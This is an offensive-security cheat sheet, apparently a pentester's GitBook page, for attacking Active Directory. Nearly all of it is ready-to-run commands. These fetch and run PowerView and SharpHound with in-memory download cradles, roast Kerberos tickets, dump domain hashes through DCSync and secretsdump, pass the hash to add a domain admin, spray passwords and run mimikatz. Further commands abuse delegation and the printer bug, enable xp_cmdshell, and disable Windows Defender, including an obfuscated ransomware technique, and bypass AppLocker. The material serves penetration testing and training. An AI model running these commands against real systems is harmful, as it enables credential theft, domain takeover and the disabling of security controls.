# Domain Enumeration + Exploitation

### PowerSploit

Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheat sheet, [check out HarmJ0y's](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
```
{% endcode %}

#### Get Domain Users

{% code overflow="wrap" %}
```powershell
Get-NetUser * -Domain burmat.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv
```
{% endcode %}

#### Get Domain Computers

{% code overflow="wrap" %}
```powershell
Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv
```
{% endcode %}

#### Get Group Members

{% code overflow="wrap" %}
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object membername
```
{% endcode %}

#### SPN Ticket Request (Kerberoasting)

{% code overflow="wrap" %}
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
{% endcode %}

#### Targeted Kerberoasting

{% code overflow="wrap" %}
```powershell
Get-DomainUser 'victimuser' | Select serviceprincipalname
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash to crack
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```
{% endcode %}

#### Enumerate User DACLs

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }
```
{% endcode %}

#### Enumerate Network Shares

{% code overflow="wrap" %}
```powershell
## scan an entire domain:
find-domainshare -computerdomain burmat.local

## narrow down scope, check permissions:
find-domainshare -computername websrv.burmat.local -computerdomain burmat.local -CheckShareAccess
```
{% endcode %}

#### Impersonate Another Domain User

{% code overflow="wrap" %}
````powershell
$cred = New-Object System.Management.Automation.PSCredential "BURMAT\John.Smith", $(ConvertTo-SecureString "Spring2020!" -AsPlainText -Force);

Find-DomainShare -ComputerName fs01.burmat.local -Credential $cred -ComputerDomain burmat.local -CheckShareAccess

Invoke-UserImpersonation -Credential $cred

# now we can read the directory impersonating another user if permissions exist:
dir \\fs01.burmat.local\Private```
### Enumerate GPO's
```powershell
"{7EA15487-7F5B-4CE3-C029-CEBE6FFE6D47}" | Get-DomainGPO
````
{% endcode %}

#### Reset Domain User Password

If you own the owner of another AD user object (`WriteOwner`, `WriteDACL`, `GenericWrite`, `Owner`, etc), you can reset the password with ease:

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
$user = 'DOMAIN\owner_acct';
$pass= ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'burmatw@sh3r3' -AsPlainText -Force;
Set-DomainUserPassword -Identity 'DOMAIN\vuln_user' -AccountPassword $newpass -Credential $creds;
```
{% endcode %}

Or if you can set yourself as owner, the following will do:

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
Set-DomainObjectOwner -Identity it_admin -OwnerIdentity burmat
Add-DomainObjectAcl -TargetIdentity it_admin -PrincipalIdentity burmat
$newpass = ConvertTo-SecureString -String 'burmat123$' -AsPlainText -Force
Set-DomainUserPassword -Identity it_admin -AccountPassword $newpass
```
{% endcode %}

Or you can do it using Impacket's "smbpasswd.py", as shown below.

#### Add/Exploit DCSync Rights

Do you have `WriteDACL` to a domain? Give DCSync rights to an unprivileged domain user account:

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=burmat,DC=local" -PrincipalIdentity jsmith -Rights DCSync
```
{% endcode %}

And use these rights to dump the hashes from the domain:

{% code overflow="wrap" %}
```
meterpreter > dcsync_ntlm burmat.local\\jsmith
```
{% endcode %}

### Impacket

Thanks to the [impacket](https://github.com/SecureAuthCorp/impacket) toolset, exploiting misconfigurations in AD environments is made easier.

#### GetUserSPNs.py

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -request -dc-ip 10.10.10.123 burmat.local/xsvc:S3cur3PW123
```
{% endcode %}

#### GetNPUsers.py

Attempt to get TGTs for users that have `UF_DONT_REQUIRE_PREAUTH` set:

{% code overflow="wrap" %}
```bash
GetNPUsers.py -request -no-pass -dc-ip 10.10.10.123 burmat.local/ -usersfile users.txt
```
{% endcode %}

#### secretsdump.py

Attack a local offline copy of NTDS.dit:

{% code overflow="wrap" %}
```bash
secretsdump.py -ntds /root/l00t/ntds.dit -system /root/l00t/systemhive LOCAL
```
{% endcode %}

Or you can attack a system remotely:

{% code overflow="wrap" %}
```bash
secretsdump.py -just-dc-ntlm burmat.local/administrator@10.10.10.123
```
{% endcode %}

#### GetADUsers.py

Leverage this script to grab usernames via LDAP

{% code overflow="wrap" %}
```bash
GetADUsers.py -all -no-pass -dc-ip 10.10.10.123 burmat.local/ | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' >> users.txt
```
{% endcode %}

#### smbpasswd.py

Reset a password if you have the credentials but it is expired. Useful if you have a hash and no pw, too.

{% code overflow="wrap" %}
```bash
smbpasswd -r 10.0.0.12 -U 'burmat'
```
{% endcode %}

### NetExec

GitHub repo: [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

#### Pass-the-Hash

Because hashes are just as good:

{% code overflow="wrap" %}
```sh
# create a user
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net user burmat Pwn3dPwn3d! /add /domain'

# add to domain admins
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net group "Domain Admins" /add burmat /domain'
```
{% endcode %}

#### SMB Password Spraying

Switch out usernames/passwords/targets with lists:

{% code overflow="wrap" %}
```bash
## to spray that Spring2024! and a list of users against a list of targets:
nxc smb 'targets.txt' -u 'users.txt' -p 'Spring2024!' -d 'burmat.local'
```
{% endcode %}

#### Dumping Remote PowerShell History

{% code overflow="wrap" %}
```bash
nxc smb 10.250.1.33 -u 'dev001' -p 'burmat123$' -d 'burmat.local' -M powershell_history
```
{% endcode %}

#### Extracting Credentials

{% code overflow="wrap" %}
```bash
## mimikatz module
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' -M mimikatz -o COMMAND='privilege::debug'

## SAM database
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' --sam
```
{% endcode %}

### PowerUpSQL

GitHub Repo: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and more thorough cheat sheet: [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

#### MSSQL Enumeration

{% code overflow="wrap" %}
```powershell
## basic instance information
Get-SQLInstanceLocal

## more verbose information:
Get-SQLServerInfo -Verbose -Instance SQLSRV\SQLEXPRESS

## crawl for databse links:
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS
```
{% endcode %}

#### Execute DB Query via MSSQL Link

{% code overflow="wrap" %}
```powershell
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS -Query "select name from master..sysdatabases" | Select-Object -ExpandProperty CustomQuery
```
{% endcode %}

#### Enable xp\_cmdshell / Execute Commands

{% code overflow="wrap" %}
```powershell
## enable xp_cmdshell:
Get-SQLQuery -Instance SQLSRV\SQLEXPRESS -query "EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT ""sqlsrv.burmat.local"""

## test rce:
Get-SQLServerLinkCrawl -Instance "SQLSRV\SQLEXPRESS" -Query "exec master..xp_cmdshell 'whoami'" | Select-Object -ExpandProperty CustomQuery
```
{% endcode %}

### Kerberos

#### Brute Usernames with Nmap

{% code overflow="wrap" %}
```bash
nmap -v -Pn -p 88 --script krb5-enum-users.nse --script-args "realm='burmat.local', userdb='users.txt'" 10.10.10.123
```
{% endcode %}

#### GenericWrite to Host + User SPN = PWN

If we have `GenericWrite` privileges over a host and we are a user that has an SPN, we can write our SID to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property against the AD object and forge tickets as anyone we like. You can read more about it here: [https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path](https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path)

{% code overflow="wrap" %}
```powershell
## we can write our delegation attribute to the DC with the following:
$UserSid = Get-DomainUser svc_burmat -Properties objectsid | Select -Expand objectsid;
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($UserSid))";
$SDBytes = New-Object byte[] ($SD.BinaryLength);
$SD.GetBinaryForm($SDBytes, 0);
Get-DomainComputer websrv.burmat.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes};

## use rubeus to forge tickets as administrator accounts
rubeus.exe s4u /user:svc_burmat /ticket:doIFFDCCBRCg..SNIP.. /impersonateuser:administrator /msdsspn:cifs/websvr.burmat.local /ptt;
```
{% endcode %}

#### Setting an SPN

**With `setspn.exe`:**

{% code overflow="wrap" %}
```powershell
setspn -s MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql 
setspn -L burmat.local\svc-mssql

# remove with:
setspn -d MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql
```
{% endcode %}

`ActiveDirectory` module:

{% code overflow="wrap" %}
```powershell
Set-ADUser -Identity svc-mssql -ServicePrincipalNames @{Add='MSSQLSvc/USER-PC01.burmat.local','host/USER-PC01.burmat.local'};

# clear them out with
Set-ADUser -Identity svc-mssql -ServicePrincipalNames $Null;
```
{% endcode %}

#### Listing SPNs

**Using `ldifde`**

{% code overflow="wrap" %}
```powershell
ldifde -d "DC=burmat,DC=local" -l ServicePrincipalName -F C:\SPNs.txt
```
{% endcode %}

**Using the PowerShell Module `ActiveDirectory`**

{% code overflow="wrap" %}
```powershell
Get-ADComputer -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames;

Get-ADUser -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames;
```
{% endcode %}

**With `DirectorySearcher`**

{% code overflow="wrap" %}
```powershell
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"");
$s.PageSize = 2000; 
$s.Filter = "(servicePrincipalName=*)";
$s.FindAll();
```
{% endcode %}

**Using `ldapsearch`**

[https://burmat.gitbook.io/security/hacking/domain-exploitation#ldap-enumeration](https://burmat.gitbook.io/security/hacking/domain-exploitation#ldap-enumeration)

#### Creating a Keytab

{% code overflow="wrap" %}
```powershell
ktpass /princ wsman/svc-mssql@burmat.local /mapuser svc-mssql@burmat.local /pass "S3cur3PW123" /out svc-mssql.keytab /crypto all /ptype KRB5_NT_PRINCIPAL /mapop set
```
{% endcode %}

#### Kerberoasting:

**Rubeus**

{% code overflow="wrap" %}
```powershell
rubeus.exe kerberoast /creduser:burmat.local\xsvc /credpassword:S3cur3PW123 /outfile:user.hash
```
{% endcode %}

**PowerView**

{% code overflow="wrap" %}
```sh
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
{% endcode %}

#### Attacking spoolss ("The Printer Bug")

From a host with unconstrained delegation, "[the printer bug](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)" and [dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) can be used to cause a TGT relay from the target host to us running responder, so we can generate a TGS for any user on that target host:

{% code overflow="wrap" %}
```sh
## set up a relay with responder:
responder -I tun0 --lm # tun0 = 10.10.15.123

## execute exploit through:
proxychains python dementor.py -u xsvc -p 'S3cur3PW123' -d 'burmat.local' 10.10.15.123 10.10.10.123
```
{% endcode %}

### BloodHound

#### Ingester Launch

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod All -CompressData -SkipPing;
```
{% endcode %}

### LDAP Enumeration

#### Null Sessions

{% code overflow="wrap" %}
```sh
ldapsearch -x -h 10.10.10.123 -D '' -w '' -b "DC=BURMAT,DC=LOCAL"
```
{% endcode %}

#### Queries

Below are some useful LDAP queries that will help you enumerate a system. Some of them require a valid username/password to get more information. My go-to for these queries is `ldapsearch`. Use the following command and fill in your LDAP query in the placeholder:

{% code overflow="wrap" %}
```bash
ldapsearch -LLL -x -H ldap://burmat.local -D "svc-burmat" -w "burmat123$" -b "dc=burmat,dc=LOCAL" "<LDAP QUERY HERE>"
```
{% endcode %}

**Domain Usernames**

Get usernames into a list by enumerating user objects:

{% code overflow="wrap" %}
```bash
ldapsearch -x -h burmat.local -b "dc=burmat,dc=local" -s sub "(objectclass=user)" | grep sAMAccountName | cut -d " " -f 2 > users.txt
```
{% endcode %}

**ASREPRoast Accounts**

{% code overflow="wrap" %}
```powershell
## ldap filter to find accounts susceptible to this:
"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

## generate a list of user accounts and use impacket to exploit:

## and if you get a ticket, you can crack it:
hashcat -m 18200 -a 0 --force user.hash /usr/share/wordlists/rockyou.txt
```
{% endcode %}

**Users with SPNs**

{% code overflow="wrap" %}
```powershell
"(&(&(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
```
{% endcode %}

If you get valid domain credentials, you can dump them w/ impacket for offline cracking:

{% code overflow="wrap" %}
```sh
python GetUserSPNs.py -request burmat.local/svc-burmat:burmat123
```
{% endcode %}

**User and Computers with Unconstrained Delegation**

{% code overflow="wrap" %}
```powershell
# user:
"(&(&(objectCategory=person) (objectClass=user)) (userAccountControl:1.2.840.113556.1.4.803:=524288))"

# computer:
"(&(objectCategory=computer) (objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=524288))"
```
{% endcode %}

**Domain Administrators**

```powershell
"(&(objectClass=user) (memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=burmat,DC=local))" "objectClass=groupPolicyContainer"
```

### Endpoint Protection

#### Endpoint Detection & Response (EDR)

**Checking Status**

{% code overflow="wrap" %}
```powershell
Get-MpComputerStatus
```
{% endcode %}

**Adding Exclusion**

{% code overflow="wrap" %}
```powershell
Add-MpPreference -ExclusionPath 'C:\windows\temp'
```
{% endcode %}

**Scanning a File with Defender**

{% code overflow="wrap" %}
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -DisableRemediation -File 'C:\stager.exe'
```
{% endcode %}

**Disabling Defender**

{% code overflow="wrap" %}
```powershell
taskkill  /F /IM MSASCuiL.exe

Set-MpPreference -DisableIntrusionPreventionSystem $true `
-DisableRealtimeMonitoring $true -DisableScriptScanning $true `
-EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode `
-Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
```
{% endcode %}

**Disable Defender on Reboot (A BlackByte TTP)**

{% code overflow="wrap" %}
```powershell
powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
```
{% endcode %}

**Checking AppLocker**

{% code overflow="wrap" %}
```powershell
$a = Get-ApplockerPolicy -effective; $a.rulecollections;
```
{% endcode %}

You can also review the AppLocker policies by enumerating the Registry manually:

{% code overflow="wrap" %}
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
reg query "HKEY_LOCAL_Machine\Software\Policies\Microsoft\Windows\SrpV2" /s
```
{% endcode %}

**Language Mode**

{% code overflow="wrap" %}
```powershell
$ExecutionContext.SessionState.LanguageMode
```
{% endcode %}

**Nested PowerShell Bypass**

{% code overflow="wrap" %}
```powershell
powershell.exe -enc [BASE64THIS(powershell.exe -w hidden -c "iex(...)"]>
```
{% endcode %}

**32-Bit PowerShell Bypass**

PowerShell disabled for you? Try running the 32-bit copy of it:

{% code overflow="wrap" %}
```sh
C:\windows\syswow64\windowspowershell\v1.0\powershell whoami
```
{% endcode %}

**Default Writable Folders for Execution Control Bypass**

Try putting your payload in one of the following directories:

{% code overflow="wrap" %}
```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing 
```
{% endcode %}

**Blocking MS Defender Connections**

### Miscellaneous

{% code overflow="wrap" %}
```powershell
# list shared folders
Get-WmiObject -Class Win32_Share -Computer dc1.burmat.local

## get .NET versions installed:
dir C:\Windows\Microsoft.NET\Framework
```
{% endcode %}
